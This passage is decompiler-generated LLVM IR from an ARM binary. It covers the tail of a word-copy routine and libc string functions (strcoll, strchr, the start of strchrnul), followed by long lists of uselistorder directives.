  store i32 %v10_177e8, i32* %r1.global-to-local, align 4
  %v4_177ec = udiv i32 %v12_177e8, 256
  %v5_177ec = or i32 %v4_177ec, %v3_177e4
  store i32 %v5_177ec, i32* %lr.global-to-local, align 4
  %v3_177f0 = mul i32 %v12_177e8, 16777216
  %v4_177f4 = udiv i32 %v9_177e8, 256
  %v5_177f4 = or i32 %v3_177f0, %v4_177f4
  store i32 %v5_177f4, i32* @ip, align 4
  %v3_177f8 = mul i32 %v9_177e8, 16777216
  %v4_177fc = udiv i32 %v6_177e8, 256
  %v5_177fc = or i32 %v3_177f8, %v4_177fc
  store i32 %v5_177fc, i32* %r5.global-to-local, align 4
  %v3_17800 = mul i32 %v6_177e8, 16777216
  %v4_17804 = udiv i32 %v3_177e8, 256
  %v5_17804 = or i32 %v3_17800, %v4_17804
  store i32 %v5_17804, i32* %r4.global-to-local, align 4
  %v1_17808 = add i32 %v0_17808, -16
  %v2_17808 = inttoptr i32 %v1_17808 to i32*
  store i32 %v5_17804, i32* %v2_17808, align 4
  %v4_17808 = add i32 %v0_17808, -12
  %v5_17808 = inttoptr i32 %v4_17808 to i32*
  %v6_17808 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17808, i32* %v5_17808, align 4
  %v7_17808 = add i32 %v0_17808, -8
  %v8_17808 = inttoptr i32 %v7_17808 to i32*
  %v9_17808 = load i32, i32* @ip, align 4
  store i32 %v9_17808, i32* %v8_17808, align 4
  %v10_17808 = add i32 %v0_17808, -4
  %v11_17808 = inttoptr i32 %v10_17808 to i32*
  %v12_17808 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17808, i32* %v11_17808, align 4
  store i32 %v1_17808, i32* %r0.global-to-local, align 4
  %v0_1780c = load i32, i32* %r2.global-to-local, align 4
  %v2_1780c = add i32 %v0_1780c, -16
  store i32 %v2_1780c, i32* %r2.global-to-local, align 4
  %v6_17810 = icmp slt i32 %v0_1780c, 16
  br i1 %v6_17810, label %dec_label_pc_17814, label %dec_label_pc_177e4.dec_label_pc_177e4_crit_edge

dec_label_pc_177e4.dec_label_pc_177e4_crit_edge:  ; preds = %dec_label_pc_177e4
  %v0_177e4.pre = load i32, i32* @r3, align 4
  %v0_177e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_177e4

dec_label_pc_17814:                               ; preds = %dec_label_pc_177e4
  %v2_17814 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17814, i32* @r4, align 4
  %v5_17814 = load i8*, i8** %stack_var_-8, align 4
  %v6_17814 = ptrtoint i8* %v5_17814 to i32
  store i32 %v6_17814, i32* @r5, align 4
  store i32 %v11_177e0, i32* @lr, align 4
  %v2_17818 = add i32 %v0_1780c, -4
  store i32 %v2_17818, i32* %r2.global-to-local, align 4
  %v4_17818 = add i32 %v0_1780c, 2147483632
  %v5_17818 = and i32 %v2_17818, %v4_17818
  %v6_17818 = icmp slt i32 %v5_17818, 0
  store i1 %v6_17818, i1* %cpsr_v.global-to-local, align 1
  %v7_17818 = icmp slt i32 %v2_17818, 0
  store i1 %v7_17818, i1* %cpsr_n.global-to-local, align 1
  %v8_17818 = icmp eq i32 %v2_17818, 0
  store i1 %v8_17818, i1* %cpsr_z.global-to-local, align 1
  %v5_1781c = icmp slt i32 %v2_1780c, -12
  br i1 %v5_1781c, label %dec_label_pc_17838, label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_17814, %dec_label_pc_177d4, %dec_label_pc_17820
  %v1_1782c = phi i32 [ %v5_1782c, %dec_label_pc_17820 ], [ %v1_17808, %dec_label_pc_17814 ], [ %v0_1773019, %dec_label_pc_177d4 ]
  %v0_17820 = load i32, i32* @r3, align 4
  %v3_17820 = mul i32 %v0_17820, 16777216
  store i32 %v3_17820, i32* %ip.global-to-local, align 4
  %v0_17824 = load i32, i32* %r1.global-to-local, align 4
  %v1_17824 = add i32 %v0_17824, -4
  %v2_17824 = inttoptr i32 %v1_17824 to i32*
  %v3_17824 = load i32, i32* %v2_17824, align 4
  store i32 %v3_17824, i32* @r3, align 4
  store i32 %v1_17824, i32* %r1.global-to-local, align 4
  %v4_17828 = udiv i32 %v3_17824, 256
  %v5_17828 = or i32 %v4_17828, %v3_17820
  store i32 %v5_17828, i32* @ip, align 4
  %v2_1782c = add i32 %v1_1782c, -4
  %v3_1782c = inttoptr i32 %v2_1782c to i32*
  store i32 %v5_17828, i32* %v3_1782c, align 4
  %v4_1782c = load i32, i32* %r0.global-to-local, align 4
  %v5_1782c = add i32 %v4_1782c, -4
  store i32 %v5_1782c, i32* %r0.global-to-local, align 4
  %v0_17830 = load i32, i32* %r2.global-to-local, align 4
  %v2_17830 = add i32 %v0_17830, -4
  store i32 %v2_17830, i32* %r2.global-to-local, align 4
  %v6_17834 = icmp slt i32 %v0_17830, 4
  br i1 %v6_17834, label %dec_label_pc_17838.loopexit, label %dec_label_pc_17820

dec_label_pc_17838.loopexit:                      ; preds = %dec_label_pc_17820
  %v4_17830 = sub i32 3, %v0_17830
  %v5_17830 = and i32 %v4_17830, %v0_17830
  %v6_17830 = icmp slt i32 %v5_17830, 0
  %v7_17830 = icmp slt i32 %v2_17830, 0
  store i1 %v6_17830, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17830, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17838

dec_label_pc_17838:                               ; preds = %dec_label_pc_17838.loopexit, %dec_label_pc_17814
  %v2_176a453 = phi i32 [ %v5_1782c, %dec_label_pc_17838.loopexit ], [ %v1_17808, %dec_label_pc_17814 ]
  %v0_1769449 = phi i32 [ %v2_17830, %dec_label_pc_17838.loopexit ], [ %v2_17818, %dec_label_pc_17814 ]
  %v0_17838 = load i32, i32* %r1.global-to-local, align 4
  %v1_17838 = add i32 %v0_17838, 1
  store i32 %v1_17838, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1782c, { 0, 2, 1 }
  uselistorder i32 %v3_17820, { 1, 0 }
  uselistorder i32 %v2_17818, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17808, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_177e8, { 1, 0 }
  uselistorder i32 %v3_177e4, { 1, 0 }
  uselistorder i32 %v0_177e8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17808, { 3, 2, 1, 0 }
  uselistorder i32 %v5_177c0, { 0, 2, 1 }
  uselistorder i32 %v3_177b4, { 1, 0 }
  uselistorder i32 %v2_177ac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1779c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1777c, { 1, 0 }
  uselistorder i32 %v3_17778, { 1, 0 }
  uselistorder i32 %v0_1777c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1779c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17754, { 0, 2, 1 }
  uselistorder i32 %v3_17748, { 1, 0 }
  uselistorder i32 %v2_17740, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17730, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17710, { 1, 0 }
  uselistorder i32 %v3_1770c, { 1, 0 }
  uselistorder i32 %v0_17710, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17730, { 3, 2, 1, 0 }
  uselistorder i1 %v5_177d8, { 2, 0, 1 }
  uselistorder i32 %v0_176f0, { 1, 0 }
  uselistorder i32 %v0_177dc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1773019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_176e0, { 2, 1, 0 }
  uselistorder i32 %v0_176e0, { 2, 0, 1 }
  uselistorder i32 %v2_176d8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_176d8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_176d8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1773020, { 2, 1, 0 }
  uselistorder i32 %v11_176b4, { 1, 0 }
  uselistorder i32 %v7_176b4, { 1, 0 }
  uselistorder i32 %v1_17694, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_17694, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17698, { 1, 0 }
  uselistorder i32 %v7_1768c, { 0, 2, 1 }
  uselistorder i32 %v10_17688, { 1, 0 }
  uselistorder i32 %v9_17680, { 1, 0, 2 }
  uselistorder i32 %v6_1767c, { 1, 0 }
  uselistorder i32 %v2_17674, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_17674, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_17684, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17668, { 0, 2, 1 }
  uselistorder i32 %v13_17664, { 1, 0 }
  uselistorder i32 %v4_17660, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_17660, { 2, 0, 1 }
  uselistorder i32 %v6_17668, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17658, { 0, 2, 1 }
  uselistorder i32 %v16_17654, { 1, 0 }
  uselistorder i32 %v4_17650, { 1, 2, 0 }
  uselistorder i32 %v0_17660.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17658, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17644, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17640, { 1, 0 }
  uselistorder i32 %v1_1763c, { 1, 0 }
  uselistorder i32 %v10_17638, { 1, 0 }
  uselistorder i32 %v0_17638, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1763c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17630, { 0, 2, 1 }
  uselistorder i32 %v2_17624, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_17624, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1763c37, { 1, 2, 0 }
  uselistorder i32 %v1_1761c, { 2, 1, 0 }
  uselistorder i32 %v1_17614, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1760c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17608, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_17604, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_17604, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_175f4, { 0, 2, 1 }
  uselistorder i32 %v4_175f0, { 1, 0 }
  uselistorder i32 %v3_175e4, { 1, 0 }
  uselistorder i32 %v1_175dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_175d0, { 1, 0 }
  uselistorder i32 %v12_175cc, { 0, 2, 1 }
  uselistorder i32 %v8_175ac, { 1, 0, 2 }
  uselistorder i32 %v5_175ac, { 1, 0, 2 }
  uselistorder i32 %v2_175ac, { 1, 0, 2 }
  uselistorder i32 %v0_175ac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_175cc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17588, { 0, 2, 1 }
  uselistorder i32 %v4_17584, { 1, 0 }
  uselistorder i32 %v3_17578, { 1, 0 }
  uselistorder i32 %v1_17570, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17564, { 1, 0 }
  uselistorder i32 %v12_17560, { 0, 2, 1 }
  uselistorder i32 %v8_17540, { 1, 0, 2 }
  uselistorder i32 %v5_17540, { 1, 0, 2 }
  uselistorder i32 %v2_17540, { 1, 0, 2 }
  uselistorder i32 %v0_17540, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17560, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1751c, { 0, 2, 1 }
  uselistorder i32 %v4_17518, { 1, 0 }
  uselistorder i32 %v3_1750c, { 1, 0 }
  uselistorder i32 %v1_17504, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_174f8, { 1, 0 }
  uselistorder i32 %v12_174f4, { 0, 2, 1 }
  uselistorder i32 %v8_174d4, { 1, 0, 2 }
  uselistorder i32 %v5_174d4, { 1, 0, 2 }
  uselistorder i32 %v2_174d4, { 1, 0, 2 }
  uselistorder i32 %v0_174d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_174f4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_17530, { 0, 2, 1 }
  uselistorder i32 %v1_1752c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_174b0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_174b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17534, { 1, 0, 3, 2 }
  uselistorder i32 %v0_175cc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_174a4, { 1, 0 }
  uselistorder i32 %v0_174a4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1749c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1749c, { 1, 0, 2 }
  uselistorder i32 %v0_1749c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_175cc77, { 1, 0 }
  uselistorder i32 %v1_1747c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_17484, { 1, 0 }
  uselistorder i32 %v0_17458, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1744c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_17438, { 1, 0, 2 }
  uselistorder i32 %v1_17434, { 1, 0 }
  uselistorder i32 %v1_1742c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1742c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17424, { 0, 2, 1 }
  uselistorder i32 %v3_17424, { 3, 0, 1, 2 }
  uselistorder i1 %v0_17424, { 1, 0 }
  uselistorder i1 %v1_17424, { 1, 0 }
  uselistorder i32 %v3_17420, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17418, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17404, { 1, 2, 0 }
  uselistorder i32 %v1_173fc, { 0, 2, 1 }
  uselistorder i32 %v12_173f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_173ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_173f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_173e0, { 0, 2, 1 }
  uselistorder i32 %v1_173d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_173d8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_173d0, { 1, 0 }
  uselistorder i32 %v1_173c8, { 2, 1, 0 }
  uselistorder i32 %v2_173c0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_173c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_173bc, { 1, 0 }
  uselistorder i32 %v2_173b0, { 1, 0 }
  uselistorder i32 %v1_173b0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_173b0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_17820, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_176e8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_17674, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_17638, { 1, 0 }
  uselistorder label %dec_label_pc_17624, { 1, 0 }
  uselistorder label %dec_label_pc_175e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17578, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1750c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174ac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1747c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_17418, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_173d8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17844.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_17844 = phi i32 [ %v0_17844.pre, %bb ], [ %v5_17844, %bb3 ]
  %v0_17840 = phi i32 [ %tmp, %bb ], [ %v5_17840, %bb3 ]
  %v1_17840 = inttoptr i32 %v0_17840 to i8*
  %v2_17840 = load i8, i8* %v1_17840, align 1
  %v1_17844 = inttoptr i32 %v0_17844 to i8*
  %v2_17844 = load i8, i8* %v1_17844, align 1
  %v3_17844 = zext i8 %v2_17844 to i32
  %v2_17848 = icmp eq i8 %v2_17840, 0
  br i1 %v2_17848, label %.dec_label_pc_17854_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_17844 = add i32 %v0_17844, 1
  %v5_17840 = add i32 %v0_17840, 1
  %v3_17840 = zext i8 %v2_17840 to i32
  %v10_1784c = icmp eq i8 %v2_17840, %v2_17844
  br i1 %v10_1784c, label %entry, label %dec_label_pc_17854

.dec_label_pc_17854_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17854

dec_label_pc_17854:                               ; preds = %bb3, %.dec_label_pc_17854_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_17854_crit_edge ], [ %v3_17840, %bb3 ]
  %v2_17854.pre-phi = sub nsw i32 %.pn, %v3_17844
  ret i32 %v2_17854.pre-phi

; uselistorder directives
  uselistorder i8 %v2_17840, { 0, 2, 1 }
  uselistorder i32 %v0_17840, { 1, 0 }
  uselistorder i32 %v0_17844, { 1, 0 }
  uselistorder label %dec_label_pc_17854, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_178c4 = urem i32 %arg1, 256
  %v0_178e43 = load i32, i32* @r0, align 4
  %v1_178e44 = urem i32 %v0_178e43, 4
  %v2_178e45 = icmp eq i32 %v1_178e44, 0
  br i1 %v2_178e45, label %dec_label_pc_178ec, label %dec_label_pc_178cc

dec_label_pc_178cc:                               ; preds = %entry, %dec_label_pc_178e0
  %v0_178e0 = phi i32 [ %v1_178e0, %dec_label_pc_178e0 ], [ %v0_178e43, %entry ]
  %v1_178cc = inttoptr i32 %v0_178e0 to i8*
  %v2_178cc = load i8, i8* %v1_178cc, align 1
  %v3_178cc = zext i8 %v2_178cc to i32
  %v9_178d0 = icmp eq i32 %v3_178cc, %v1_178c4
  br i1 %v9_178d0, label %dec_label_pc_179a0, label %dec_label_pc_178d8

dec_label_pc_178d8:                               ; preds = %dec_label_pc_178cc
  %v2_178d8 = icmp eq i8 %v2_178cc, 0
  br i1 %v2_178d8, label %dec_label_pc_1799c, label %dec_label_pc_178e0

dec_label_pc_178e0:                               ; preds = %dec_label_pc_178d8
  %v1_178e0 = add i32 %v0_178e0, 1
  %v1_178e4 = urem i32 %v1_178e0, 4
  %v2_178e4 = icmp eq i32 %v1_178e4, 0
  br i1 %v2_178e4, label %dec_label_pc_178ec, label %dec_label_pc_178cc

dec_label_pc_178ec:                               ; preds = %dec_label_pc_178e0, %entry
  %v0_178f0 = phi i32 [ %v0_178e43, %entry ], [ %v1_178e0, %dec_label_pc_178e0 ]
  %v4_178ec = mul nuw nsw i32 %v1_178c4, 256
  %v5_178ec = or i32 %v4_178ec, %v1_178c4
  %v4_178f4 = mul i32 %v5_178ec, 65536
  %v5_178f4 = or i32 %v4_178f4, %v5_178ec
  br label %dec_label_pc_178f8

dec_label_pc_178f8:                               ; preds = %dec_label_pc_17994, %dec_label_pc_17934, %dec_label_pc_178ec
  %v0_1795c = phi i32 [ %v0_178f0, %dec_label_pc_178ec ], [ %v4_178f8, %dec_label_pc_17934 ], [ %v4_178f8, %dec_label_pc_17994 ]
  %v1_178f8 = inttoptr i32 %v0_1795c to i32*
  %v2_178f8 = load i32, i32* %v1_178f8, align 4
  %v4_178f8 = add i32 %v0_1795c, 4
  %v2_17900 = xor i32 %v2_178f8, %v5_178f4
  %v2_1790c = add i32 %v2_178f8, 2130640639
  %v1_17910 = sub i32 -1, %v2_178f8
  %v2_17914 = xor i32 %v2_1790c, %v1_17910
  %v2_17920 = and i32 %v2_17914, -2130640640
  store i32 %v2_17920, i32* @r1, align 4
  %v2_17928 = icmp eq i32 %v2_17920, 0
  br i1 %v2_17928, label %dec_label_pc_17934, label %dec_label_pc_1793c

dec_label_pc_17934:                               ; preds = %dec_label_pc_178f8
  %v2_17904 = add i32 %v2_17900, 2130640639
  %v1_1791c = sub i32 -1, %v2_17900
  %v2_17924 = xor i32 %v2_17904, %v1_1791c
  %v2_1792c = and i32 %v2_17924, -2130640640
  %v2_17934 = icmp eq i32 %v2_1792c, 0
  br i1 %v2_17934, label %dec_label_pc_178f8, label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %dec_label_pc_178f8, %dec_label_pc_17934
  %v2_1793c = inttoptr i32 %v0_1795c to i8*
  %v3_1793c = load i8, i8* %v2_1793c, align 1
  %v4_1793c = zext i8 %v3_1793c to i32
  %v9_17940 = icmp eq i32 %v4_1793c, %v1_178c4
  br i1 %v9_17940, label %dec_label_pc_179a0, label %dec_label_pc_1794c

dec_label_pc_1794c:                               ; preds = %dec_label_pc_1793c
  %v2_1794c = icmp eq i8 %v3_1793c, 0
  br i1 %v2_1794c, label %dec_label_pc_1799c, label %dec_label_pc_17954

dec_label_pc_17954:                               ; preds = %dec_label_pc_1794c
  %v1_17954 = add i32 %v0_1795c, 1
  %v2_17954 = inttoptr i32 %v1_17954 to i8*
  %v3_17954 = load i8, i8* %v2_17954, align 1
  %v4_17954 = zext i8 %v3_17954 to i32
  %v9_17958 = icmp eq i32 %v4_17954, %v1_178c4
  br i1 %v9_17958, label %dec_label_pc_179a0, label %dec_label_pc_17964

dec_label_pc_17964:                               ; preds = %dec_label_pc_17954
  %v2_17964 = icmp eq i8 %v3_17954, 0
  br i1 %v2_17964, label %dec_label_pc_1799c, label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_17964
  %v1_1796c = add i32 %v0_1795c, 2
  %v2_1796c = inttoptr i32 %v1_1796c to i8*
  %v3_1796c = load i8, i8* %v2_1796c, align 1
  %v4_1796c = zext i8 %v3_1796c to i32
  %v9_17970 = icmp eq i32 %v4_1796c, %v1_178c4
  br i1 %v9_17970, label %dec_label_pc_179a0, label %dec_label_pc_1797c

dec_label_pc_1797c:                               ; preds = %dec_label_pc_1796c
  %v2_1797c = icmp eq i8 %v3_1796c, 0
  br i1 %v2_1797c, label %dec_label_pc_1799c, label %dec_label_pc_17984

dec_label_pc_17984:                               ; preds = %dec_label_pc_1797c
  %v1_17984 = add i32 %v0_1795c, 3
  %v2_17984 = inttoptr i32 %v1_17984 to i8*
  %v3_17984 = load i8, i8* %v2_17984, align 1
  %v4_17984 = zext i8 %v3_17984 to i32
  %v9_17988 = icmp eq i32 %v4_17984, %v1_178c4
  br i1 %v9_17988, label %dec_label_pc_179a0, label %dec_label_pc_17994

dec_label_pc_17994:                               ; preds = %dec_label_pc_17984
  %v2_17994 = icmp eq i8 %v3_17984, 0
  br i1 %v2_17994, label %dec_label_pc_1799c, label %dec_label_pc_178f8

dec_label_pc_1799c:                               ; preds = %dec_label_pc_178d8, %dec_label_pc_17994, %dec_label_pc_1797c, %dec_label_pc_17964, %dec_label_pc_1794c
  br label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_178cc, %dec_label_pc_17984, %dec_label_pc_1796c, %dec_label_pc_17954, %dec_label_pc_1793c, %dec_label_pc_1799c
  %v1_179a4 = phi i32 [ 0, %dec_label_pc_1799c ], [ %v1_17984, %dec_label_pc_17984 ], [ %v1_1796c, %dec_label_pc_1796c ], [ %v1_17954, %dec_label_pc_17954 ], [ %v0_1795c, %dec_label_pc_1793c ], [ %v0_178e0, %dec_label_pc_178cc ]
  ret i32 %v1_179a4

; uselistorder directives
  uselistorder i32 %v4_178f8, { 1, 0 }
  uselistorder i32 %v2_178f8, { 0, 2, 1 }
  uselistorder i32 %v0_1795c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_178ec, { 1, 0 }
  uselistorder i32 %v1_178e0, { 1, 0, 2 }
  uselistorder i32 %v0_178e43, { 2, 1, 0 }
  uselistorder i32 %v1_178c4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_179a0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1799c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1793c, { 1, 0 }
  uselistorder label %dec_label_pc_178cc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_179b4 = urem i32 %arg1, 256
  %v0_179d42 = load i32, i32* @r0, align 4
  %v1_179d43 = urem i32 %v0_179d42, 4
  %v2_179d44 = icmp eq i32 %v1_179d43, 0
  br i1 %v2_179d44, label %dec_label_pc_179dc, label %dec_label_pc_179bc

dec_label_pc_179bc:                               ; preds = %entry, %dec_label_pc_179d0
  %v0_179d0 = phi i32 [ %v1_179d0, %dec_label_pc_179d0 ], [ %v0_179d42, %entry ]
  %v1_179bc = inttoptr i32 %v0_179d0 to i8*
  %v2_179bc = load i8, i8* %v1_179bc, align 1
  %v3_179bc = zext i8 %v2_179bc to i32
  %v9_179c0 = icmp eq i32 %v3_179bc, %v1_179b4
